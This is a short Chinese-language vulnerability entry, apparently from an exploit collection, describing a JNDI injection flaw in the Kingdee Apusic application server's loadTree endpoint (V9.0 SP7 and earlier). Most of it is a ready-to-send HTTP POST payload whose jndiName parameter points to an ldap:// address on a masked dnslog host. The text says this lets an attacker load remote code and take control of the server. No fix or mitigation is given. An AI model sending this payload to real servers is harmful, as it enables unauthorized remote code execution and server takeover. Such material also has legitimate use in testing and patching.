### **漏洞描述：**

金蝶Apusic应用服务器 loadTree 接口存在jndi注入，攻击者可通过jndi注入远程加载代码获取服务器权限。

### **影响版本：**

V9.0 SP7及以下版本

### **Payload：**

```jsx
POST /appmonitor/protect/jndi/loadTree HTTP/1.1
Host:host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: EASSESSIONID=141476053; NAPRoutID=141476053; sl-session=V1nreK33g2WZuswc79lAOQ==
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
SL-CE-SUID: 73

jndiName=ldap://***.dnslog.pw
```

---
